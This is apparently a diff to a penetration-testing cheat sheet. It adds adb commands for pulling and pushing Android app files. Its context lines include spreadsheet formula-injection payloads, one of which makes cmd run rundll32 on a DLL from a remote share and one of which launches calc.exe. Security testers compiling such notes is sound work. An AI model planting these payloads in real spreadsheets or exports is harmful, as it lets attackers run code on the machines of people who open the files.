@@ -116,6 +116,16 @@ https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-uploa
 	=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
 	=@MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!_xlbgnm.A1
 
+# Adb Command
+	adb root
+	
+## Download application from enumalator
+	adb pull /data/app/{package-name} /{location}
+	
+## Install Application or transfer file
+	adb push {file.path} {location}
+
+
 # Android Apk VAPT
 
 ## Direct Start
